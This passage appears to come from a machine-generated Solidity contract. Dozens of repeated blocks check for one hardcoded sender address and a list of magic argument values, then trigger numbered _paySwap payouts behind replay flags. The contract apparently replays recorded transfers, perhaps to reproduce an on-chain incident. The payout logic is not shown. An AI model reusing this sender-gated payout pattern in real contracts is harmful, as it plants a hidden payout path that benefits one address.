                        _paySwap32();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950221751162858 || arg1 == 13495950221751162858)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950221751162858]) {
                        _paySwap58();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950223541647986 || arg1 == 13495950223541647986)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950223541647986]) {
                        _paySwap119();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950225332133114 || arg1 == 13495950225332133114)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950225332133114]) {
                        _paySwap109();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950227122618243 || arg1 == 13495950227122618243)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950227122618243]) {
                        _paySwap67();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950228913103371 || arg1 == 13495950228913103371)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950228913103371]) {
                        _paySwap134();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950230703588500 || arg1 == 13495950230703588500)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950230703588500]) {
                        _paySwap123();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950232494073630 || arg1 == 13495950232494073630)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950232494073630]) {
                        _paySwap158();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950234284558760 || arg1 == 13495950234284558760)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950234284558760]) {
                        _paySwap91();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950236075043891 || arg1 == 13495950236075043891)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950236075043891]) {
                        _paySwap65();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950237865529022 || arg1 == 13495950237865529022)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950237865529022]) {
                        _paySwap188();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950239656014153 || arg1 == 13495950239656014153)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950239656014153]) {
                        _paySwap83();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950241446499285 || arg1 == 13495950241446499285)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950241446499285]) {
                        _paySwap8();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950243236984418 || arg1 == 13495950243236984418)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950243236984418]) {
                        _paySwap139();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950245027469552 || arg1 == 13495950245027469552)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950245027469552]) {
                        _paySwap19();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950246817954683 || arg1 == 13495950246817954683)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950246817954683]) {
                        _paySwap179();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950248608439818 || arg1 == 13495950248608439818)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950248608439818]) {
                        _paySwap113();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950250398924952 || arg1 == 13495950250398924952)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950250398924952]) {
                        _paySwap16();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950252189410088 || arg1 == 13495950252189410088)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950252189410088]) {
                        _paySwap152();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950253979895222 || arg1 == 13495950253979895222)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950253979895222]) {
                        _paySwap133();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950255770380358 || arg1 == 13495950255770380358)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950255770380358]) {
                        _paySwap192();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950257560865493 || arg1 == 13495950257560865493)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950257560865493]) {
                        _paySwap74();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950259351350631 || arg1 == 13495950259351350631)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950259351350631]) {
                        _paySwap142();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950261141835769 || arg1 == 13495950261141835769)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950261141835769]) {
                        _paySwap15();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950262932320906 || arg1 == 13495950262932320906)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950262932320906]) {
                        _paySwap41();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950264722806043 || arg1 == 13495950264722806043)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950264722806043]) {
                        _paySwap38();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950266513291182 || arg1 == 13495950266513291182)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950266513291182]) {
                        _paySwap127();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950268303776321 || arg1 == 13495950268303776321)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950268303776321]) {
                        _paySwap26();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950270094261460 || arg1 == 13495950270094261460)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950270094261460]) {
                        _paySwap169();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950271884746600 || arg1 == 13495950271884746600)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950271884746600]) {
                        _paySwap96();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950273675231740 || arg1 == 13495950273675231740)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950273675231740]) {
                        _paySwap5();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950275465716881 || arg1 == 13495950275465716881)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950275465716881]) {
                        _paySwap80();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950277256202022 || arg1 == 13495950277256202022)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950277256202022]) {
                        _paySwap157();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950279046687164 || arg1 == 13495950279046687164)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950279046687164]) {
                        _paySwap88();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950280837172305 || arg1 == 13495950280837172305)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950280837172305]) {
                        _paySwap132();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950282627657448 || arg1 == 13495950282627657448)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950282627657448]) {
                        _paySwap55();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950284418142591 || arg1 == 13495950284418142591)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950284418142591]) {
                        _paySwap36();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950286208627735 || arg1 == 13495950286208627735)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950286208627735]) {
                        _paySwap195();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950287999112878 || arg1 == 13495950287999112878)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950287999112878]) {
                        _paySwap191();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950289789598024 || arg1 == 13495950289789598024)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950289789598024]) {
                        _paySwap10();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950291580083167 || arg1 == 13495950291580083167)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950291580083167]) {
                        _paySwap47();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950293370568313 || arg1 == 13495950293370568313)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950293370568313]) {
                        _paySwap39();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950295161053458 || arg1 == 13495950295161053458)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950295161053458]) {
                        _paySwap172();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950296951538605 || arg1 == 13495950296951538605)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950296951538605]) {
                        _paySwap90();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950298742023753 || arg1 == 13495950298742023753)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950298742023753]) {
                        _paySwap46();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950300532508899 || arg1 == 13495950300532508899)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950300532508899]) {
                        _paySwap69();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950302322994047 || arg1 == 13495950302322994047)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950302322994047]) {
                        _paySwap197();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950304113479194 || arg1 == 13495950304113479194)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950304113479194]) {
                        _paySwap177();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950305886059491 || arg1 == 13495950305886059491)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950305886059491]) {
                        _paySwap194();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950307658639789 || arg1 == 13495950307658639789)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950307658639789]) {
                        _paySwap165();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950309431220087 || arg1 == 13495950309431220087)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950309431220087]) {
                        _paySwap50();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950311203800386 || arg1 == 13495950311203800386)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950311203800386]) {
                        _paySwap64();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950312994285535 || arg1 == 13495950312994285535)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950312994285535]) {
                        _paySwap124();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950314784770686 || arg1 == 13495950314784770686)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950314784770686]) {
                        _paySwap183();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950316575255838 || arg1 == 13495950316575255838)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950316575255838]) {
                        _paySwap23();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950318365740990 || arg1 == 13495950318365740990)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950318365740990]) {
                        _paySwap198();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950320156226142 || arg1 == 13495950320156226142)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950320156226142]) {
                        _paySwap73();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950321946711294 || arg1 == 13495950321946711294)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950321946711294]) {
                        _paySwap141();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950323737196447 || arg1 == 13495950323737196447)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950323737196447]) {
                        _paySwap193();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950325527681601 || arg1 == 13495950325527681601)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950325527681601]) {
                        _paySwap187();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950327318166755 || arg1 == 13495950327318166755)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950327318166755]) {
                        _paySwap174();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950329108651909 || arg1 == 13495950329108651909)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950329108651909]) {
                        _paySwap35();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950330899137063 || arg1 == 13495950330899137063)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950330899137063]) {
                        _paySwap93();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950332689622220 || arg1 == 13495950332689622220)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950332689622220]) {
                        _paySwap60();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950334480107375 || arg1 == 13495950334480107375)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950334480107375]) {
                        _paySwap131();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950336270592532 || arg1 == 13495950336270592532)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950336270592532]) {
                        _paySwap98();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950338061077688 || arg1 == 13495950338061077688)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950338061077688]) {
                        _paySwap182();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950339851562845 || arg1 == 13495950339851562845)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950339851562845]) {
                        _paySwap63();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950341642048003 || arg1 == 13495950341642048003)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950341642048003]) {
                        _paySwap18();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950343432533161 || arg1 == 13495950343432533161)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950343432533161]) {
                        _paySwap78();
                    }
                    return;
                }
            }
